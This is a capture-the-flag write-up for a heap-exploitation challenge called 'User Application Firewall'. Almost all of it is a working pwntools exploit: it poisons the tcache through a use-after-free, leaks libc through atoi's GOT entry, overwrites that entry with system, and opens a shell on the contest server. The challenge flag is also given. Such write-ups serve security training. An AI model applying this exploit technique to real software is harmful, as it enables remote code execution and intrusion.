![image](https://user-images.githubusercontent.com/63996033/229366754-2bd60450-68a6-42ef-97a3-3f7458208868.png)

[libc.so.6](https://github.com/jeromepalayoor/RITSEC-CTF-2023/blob/main/BIN-PWN/User%20Application%20Firewall/libc.so.6) [uaf](https://github.com/jeromepalayoor/RITSEC-CTF-2023/blob/main/BIN-PWN/User%20Application%20Firewall/uaf) [uaf.c](https://github.com/jeromepalayoor/RITSEC-CTF-2023/blob/main/BIN-PWN/User%20Application%20Firewall/uaf.c)

Solution:
```py
from pwn import *

exe = ELF('./uaf')
libc = ELF('./libc.so.6')

context.binary = exe

sh = remote('host1.metaproblems.com', 5600)
@atexception.register
def handler():
    log.failure(sh.recvall())

def create(input):
    sh.sendlineafter(b'> ', b'1')
    sh.sendlineafter(b'here:', input)
    sh.recvuntil(b'rule ID is: ')
    return sh.recv(1)

def view(id, amount):
    sh.sendlineafter(b'> ', b'2')
    sh.sendlineafter(b'want to view:', str(id).encode())
    sh.recvuntil(b'Your rule: ')
    return sh.recv(amount)

def edit(id, input):
    sh.sendlineafter(b'> ', b'3')
    sh.sendlineafter(b'want to edit:', str(id).encode())
    sh.sendlineafter(b'here:', input)

def delete(id):
    sh.sendlineafter(b'> ', b'4')
    sh.sendlineafter(b'want to delete:', str(id).encode())

def getshell():
    sh.sendlineafter(b'> ', b'/bin/sh')
    sh.interactive()

rule0 = 0x404160

create(b'')
delete(0)
edit(0, p64(rule0)) # poison the tcache, make malloc return pointer to to rules[0]
create(b'') # 0
create(p64(exe.got['atoi'])) # 1
atoi = u64(view(0, 6).ljust(8, b'\x00'))

libc.address = atoi - libc.sym['atoi']
log.success('Address of libc base: ' + hex(libc.address))

edit(0, p64(libc.sym['system']))
getshell()
```

Flag: `MetaCTF{not_all_vulnerabilities_happen_on_the_stack}`
